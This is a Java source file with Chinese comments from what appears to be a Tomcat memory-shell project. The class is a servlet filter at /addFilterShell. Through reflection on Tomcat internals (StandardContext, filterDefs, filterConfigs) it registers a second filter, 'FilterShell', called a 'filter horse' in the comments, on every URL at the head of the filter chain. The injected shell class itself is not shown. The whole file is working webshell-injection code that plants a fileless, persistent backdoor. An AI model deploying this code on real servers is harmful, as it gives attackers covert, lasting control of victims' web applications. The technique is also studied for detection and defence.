package com.tomcatmemshell.filter;

import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Map;

@WebFilter("/addFilterShell")
public class FilterMemshell implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        try {
            // 先拿到 ServletContext
            ServletContext servletContext = servletRequest.getServletContext();
            Field appctx = servletContext.getClass().getDeclaredField("context");
            appctx.setAccessible(true);
            // 从 ServletContext 里面拿到 ApplicationContext
            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
            Field atx = applicationContext.getClass().getDeclaredField("context");
            atx.setAccessible(true);
            // 从 ApplicationContext 里面拿到 StandardContext
            StandardContext standardContext = (StandardContext) atx.get(applicationContext);

            // 准备filter马
            FilterShell filterShell = new FilterShell();
            // 拿到关键的三个对象
            Field filterDefsField = standardContext.getClass().getDeclaredField("filterDefs");
            filterDefsField.setAccessible(true);
            Field filterMapsField = standardContext.getClass().getDeclaredField("filterMaps");
            filterMapsField.setAccessible(true);
            Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
            filterConfigsField.setAccessible(true);

            // 用 def 包装 filter
            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(filterShell);
            filterDef.setFilterName(filterShell.getClass().getName());
            filterDef.setFilterClass(filterShell.getClass().getName());
            // 添加到上下文
            standardContext.addFilterDef(filterDef);

            // 由于 ApplicationFilterConfig 的构造方法不是 public，无法通过普通的 new 关键字创建实例，所以必须使用反射来访问私有构造方法
            // ApplicationFilterConfig filterConfig = new ApplicationFilterConfig(standardContext,filterDef);
            // 创建 filterConfig
            Class<?> ac = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
            // Class<?> ac1 = this.getClass().getClassLoader().loadClass("org.apache.catalina.core
            // .ApplicationFilterConfig");
            // 构造方法不是 public 的
            Constructor constructor = ac.getDeclaredConstructor(org.apache.catalina.Context.class, org.apache.tomcat.util.descriptor.web.FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
            // 添加到 filterConfigs
            Map<String, ApplicationFilterConfig> filterConfigs = (Map<String, ApplicationFilterConfig>) filterConfigsField.get(standardContext);
            filterConfigs.put(filterShell.getClass().getName(), filterConfig);
            // 改 modifiers
//            Field modifiers = filterConfigsField.getClass().getDeclaredField("modifiers");
//            modifiers.setAccessible(true);
//            modifiers.setInt(filterConfigsField, filterConfigsField.getModifiers() & ~Modifier.FINAL);

            // 配置映射关系
            FilterMap filterMap = new FilterMap();
            filterMap.setFilterName(filterShell.getClass().getName());
            filterMap.addURLPattern("/*");
            // 添加到上下文
            // standardContext.addFilterMap(filterMap);
            // 添加到第一位
            standardContext.addFilterMapBefore(filterMap);
        } catch (Exception e) {
            e.printStackTrace();
        }
        servletResponse.getWriter().write("add failed!");

        // 不影响程序可用性
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {

    }
}
